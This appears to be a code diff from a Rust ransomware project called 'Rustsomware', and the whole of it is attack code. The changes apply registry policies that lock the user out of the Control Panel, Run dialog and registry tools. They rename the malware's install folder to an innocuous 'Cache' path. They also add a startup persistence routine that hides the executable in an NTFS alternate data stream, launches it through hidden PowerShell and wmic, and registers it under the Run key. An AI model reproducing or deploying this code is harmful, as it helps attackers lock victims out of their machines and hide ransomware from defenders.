@@ -2,6 +2,7 @@ use dirs;
 use mslnk::ShellLink;
 use std::fs;
 use std::path::Path;
+use std::process::{Command, Stdio};
 use std::str;
 use winreg;
 use winreg::enums::*;
@@ -20,10 +21,6 @@ pub fn lock_down_system() {
     key.set_value("HidePowerOptions", &1u32);
     key.set_value("NoControlPanel", &1u32);
     key.set_value("NoRun", &1u32);
-
-    let path = Path::new("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
-    let (key, disp) = hkcu.create_subkey(&path).unwrap();
-    key.set_value("DisableCMD", &1u32);
 
     let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
     let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
@@ -252,7 +249,7 @@ pub fn lock_down_system() {
     key.set_value("DisableRegistryTools", &1u32);
 }
 
-pub fn start_ransomware_on_startup() {
+pub fn start_ransomware_on_startup_classic() {
     let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
     let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
     let (key, disp) = hklm.create_subkey(&path).unwrap();
@@ -274,8 +271,8 @@ pub fn start_ransomware_on_startup() {
     // Copy the program to a different path
     match get_home_dir() {
         Some(dir) => {
-            let destination = dir.clone() + "\\AppData\\Roaming\\rustsomware\\";
-            let target = dir.clone() + "\\AppData\\Roaming\\rustsomware\\" + &exec_name;
+            let destination = dir.clone() + "\\AppData\\Roaming\\Cache\\";
+            let target = dir.clone() + "\\AppData\\Roaming\\Cache\\" + &exec_name;
             let lnk = target.clone() + ".lnk";
             match fs::create_dir(&destination) {
                 Ok(_) => (),
@@ -294,6 +291,102 @@ pub fn start_ransomware_on_startup() {
                     Err(_) => (),
                 },
                 Err(_) => (),
+            }
+        }
+        None => (),
+    }
+}
+
+pub fn start_ransomware_on_startup_alternate_data_stream() {
+    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
+    let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+    let (key, disp) = hklm.create_subkey(&path).unwrap();
+    let run = hklm
+        .open_subkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
+        .unwrap();
+
+    // Check if program is not already in startup, if is not goes on
+    match run.get_value::<String, String>(String::from("Rustsomware")) {
+        Ok(_) => return,
+        Err(_) => (),
+    };
+
+    let exec_name = match get_exec_name() {
+        Some(name) => name,
+        None => return,
+    };
+
+    // Copy the program to a different path
+    match get_home_dir() {
+        Some(dir) => {
+            let ads_folder = dir.clone() + "\\AppData\\Roaming\\Cache";
+            let ads_exe = dir.clone() + "\\AppData\\Roaming\\Cache:default_id";
+
+            match fs::create_dir(&ads_folder) {
+                Ok(_) => (),
+                Err(_) => {
+                    println!("Error creating dir cache!");
+                    start_ransomware_on_startup_classic();
+                    return;
+                }
+            }
+
+            let destination = dir.clone() + "\\AppData\\Roaming\\rustsomware\\";
+            let target = dir.clone() + "\\AppData\\Roaming\\rustsomware\\" + &exec_name;
+            match fs::create_dir(&destination) {
+                Ok(_) => (),
+                Err(_) => {
+                    fs::remove_dir_all(&destination);
+                    fs::create_dir(&destination);
+                    ()
+                }
+            }
+
+            let mut startup_command =
+                "cmd /c start /min cmd /c powershell -W Hidden -C \"(expand ".to_string();
+            startup_command.push_str(&(String::from("'\"") + &ads_exe + "\"'"));
+            startup_command.push_str(&" ");
+            startup_command.push_str(&(String::from("'\"") + &dir + "\\" + &exec_name + "\"'"));
+            startup_command.push_str(&") -and (wmic process call create '\"");
+            startup_command.push_str(&(dir.clone() + "\\" + &exec_name + "\"'"));
+            startup_command.push_str(&")\"");
+
+            match fs::copy(&exec_name, &target) {
+                Ok(_) => {
+                    let command = format!(
+                        "Start-Process \"cmd.exe\" '/c type \"{}\" > \"{}\"' -NoNewWindow",
+                        &target, &ads_exe
+                    );
+                    match Command::new("cmd")
+                        .args([
+                            "/c",
+                            "start",
+                            "/min",
+                            "cmd",
+                            "/c",
+                            "powershell",
+                            "-WindowStyle",
+                            "Hidden",
+                            "-NonInteractive",
+                            "-NoLogo",
+                            "-Command",
+                            &command,
+                        ])
+                        .spawn()
+                    {
+                        Ok(_) => {
+                            key.set_value("Rustsomware", &startup_command);
+                        }
+                        Err(_) => {
+                            start_ransomware_on_startup_classic();
+                            return;
+                        }
+                    }
+                }
+                Err(_) => {
+                    start_ransomware_on_startup_classic();
+                    return;
+                }
             }
         }
         None => (),
